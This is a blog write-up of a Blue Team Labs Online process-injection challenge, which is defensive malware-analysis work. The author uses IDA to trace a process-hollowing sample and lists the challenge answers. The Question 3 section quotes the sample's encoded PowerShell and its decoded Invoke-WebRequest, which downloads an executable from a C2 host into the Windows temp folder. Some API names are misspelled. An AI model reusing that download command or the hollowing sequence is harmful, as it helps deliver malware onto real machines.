--- 
layout: post
title: Injection Series Part 4
date: 2024-01-29 00:00 +0700
categories: [BTLO, Reverse Engineering]
tags: [Process Injection, Malware Analysis, Blue Team, btlo, Reverse, IDA, Ghidra]     # TAG names should always be lowercase
img_path: '/assets/BTLO/Injection_Series_Part_4'
image: 
  path: logo.png
--- 

Hi everyone ~

Don't forget the warning 

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/71ee1b3e-b74a-4e9a-810b-e522141ab873)

### Question 1) What is the process that would be first spawned by the sample? And what is the API used? (Format: Format: process, APICall) (1 points)

The tags of the topic are also mentioned, this time I still use `IDA` 

The question tells us to find the process that was first created with the malicious file and which API was used.

OK, go to `IDA` via the `Strings` tab and you will see it immediately

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/c40ba8b1-42b6-407c-aeae-b72ae056bba8)

yah, now go to the `IDA View-A` tab to see which `APIcall` it used

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/6c97a53e-d858-46e8-ba05-74c0d3c39717)

`notepad.exe, CreateProcessA`

### Question 2) The value 4 has been pushed as a parameter to this API, what does that denote? (Format: FLAG) (1 points)

I still don't quite understand what it will do @~@, go to GG and look it up

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/1fb95d33-07cd-41a4-8b2e-4fe11ac27729)

And these parameters are of `API(CreateProcessA)` hmmm...

After a while of consulting, I found this [CreateProcessA function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/39153476-1e63-41ac-8cbe-2d34b869c8d3)

Please read it, it's very useful

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/cf54151e-bc7b-416e-9d34-6d682367cdb7)

With `a value of 4 (0x00000004)`, tt is used to load the process in suspended mode and will not run until the `ResumaThread` function is opened

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/87ee8f78-d603-499c-b063-99ed44817979)

`Create_Suspended` 

### Question 3) What is the domain that the malware tries to connect? (Format: domain.tld) (1 points)

You remember from the previous article there was no `Powershell` command, let's decode them and we will have the answer

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/616fa907-4864-4b58-88ff-bf631c576692)

```
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AcwBvAG0AZQBjADIALgBzAGUAcgB2AGUAcgAvAGUAeABwAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABjADoAXABcAHcAaQBuAGQAbwB3AHMAXABcAHQAZQBtAHAAXABcAGUAeABwAC4AZQB4AGUACgA=

```

go to [CyberChef](https://gchq.github.io/CyberChef/) and decode them

this is the result after removing the null byte

`Invoke-WebRequest -Uri http://somec2.server/exp.exe -OutFile c:\\windows\\temp\\exp.exe`

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/c03e5212-0ea8-4c77-9a8d-4bb6fcfe94e6)

`somec2.server`

### Question 4) What is the cmdlet used to download the file and what is the path of the file stored? (Format: CMDLET, path) (1 points)

in the sentence above :>

`Invoke-Webrequest, c:\windows\temp\exp.exe` 

### Question 5) Just after the file download instructions, a function from ntdll has been loaded and invoked by the sample. What is the function name? (Format: Function) (2 points)

Finding it seems easy XD

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/0ddd7ff1-c271-41f2-a3ac-06c07bc29d50)

`NtUnmapViewOfSection`

### Question 6) After the allocation of memory and writing the date into the allocated memory. What are the 2 APIs used to update the entry point and resume the thread? (Format: API, API) (2 points)

It took me a while to realize the suggestion above in the topic `resume the thread` 
> let's focus on searching for APIs -> `thread`

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/8c341b27-0e45-42ad-8f95-2fe30e1e682e)

`SetThreadTontext, ResumeThread`

### Question 7) What is the MITRE ID for this technique implemented in this sample? (Format: TXXXX.XXX) (2 points)

I tried with 2 APIs I just found :)))
>it's wrongggggggg

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/cf37785d-162b-41f9-a076-070751e6113d)

Honestly, my goal is to try them all

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/7bf04c6a-5a0f-4245-9fff-b3704bd38a48)

But it was right to come here lol

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/28058b7e-d958-43e1-be03-676487cdeb65)

`T1055.002`

goodbye, thank you for reading until now //~//




